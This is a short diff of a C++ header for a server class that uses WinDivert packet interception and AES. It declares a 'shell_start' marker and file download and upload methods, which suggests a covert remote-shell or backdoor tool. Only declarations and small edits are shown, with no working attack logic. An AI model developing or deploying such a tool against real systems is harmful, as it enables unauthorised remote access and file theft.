@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <sstream>
 #include <iostream>
+#include <fstream>
 #include <process.h>
 #include "windivert.h"
 #include "aes.h"
@@ -9,7 +10,7 @@
 using namespace std;
 
 #define SHELL_START "shell_start"
-#define FILE_SIZE 1024
+#define FILE_SIZE 1024	// better less than 1460(MSS)
 
 class CServer
 {
@@ -53,5 +54,4 @@ private:
 	void wait_for_connect();
 	void download_file(string download_str);
 	void upload_file(string upload_str);
-	void wait_for_recv();
 };
